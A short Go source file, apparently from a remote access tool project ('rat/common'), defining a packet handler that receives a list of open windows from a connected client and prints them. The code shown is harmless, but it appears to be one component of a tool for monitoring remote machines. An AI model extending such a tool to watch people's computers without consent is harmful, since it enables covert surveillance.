package main

import (
	"fmt"
	"rat/common"
)

type WindowsPacket struct {
	Windows []common.Window `network:"receive"`
}

func (packet WindowsPacket) Header() common.PacketHeader {
	return common.WindowsHeader
}

func (packet WindowsPacket) Init(c *Client) {

}

func (packet WindowsPacket) OnReceive(c *Client) error {
	for _, window := range packet.Windows {
		fmt.Println(window)
	}

	return nil
}
